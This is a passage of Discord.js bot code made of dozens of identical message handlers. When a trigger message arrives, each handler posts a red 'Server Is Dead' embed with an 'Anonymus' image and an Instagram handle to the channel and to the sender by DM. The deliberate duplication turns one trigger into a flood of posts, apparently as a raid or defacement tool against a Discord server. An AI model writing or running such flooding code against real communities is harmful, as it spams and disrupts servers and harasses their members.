  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
